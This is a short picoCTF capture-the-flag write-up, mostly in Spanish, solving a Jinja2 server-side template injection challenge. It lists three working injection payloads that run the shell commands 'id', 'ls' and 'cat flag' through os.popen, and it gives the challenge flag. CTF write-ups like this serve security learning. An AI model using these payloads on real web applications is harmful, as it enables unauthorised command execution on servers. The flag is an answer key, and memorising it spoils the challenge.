### Descripción 
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:62681/)!
### Solución 
ingresé a la página on security y traté de hacer algunas injecciones y esta fué la que me funcionó

paso 1:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
paso 2:
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
paso 3:
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
### Notas adicionales
### Referencias
https://onsecurity.io/article/server-side-template-injection-with-jinja2/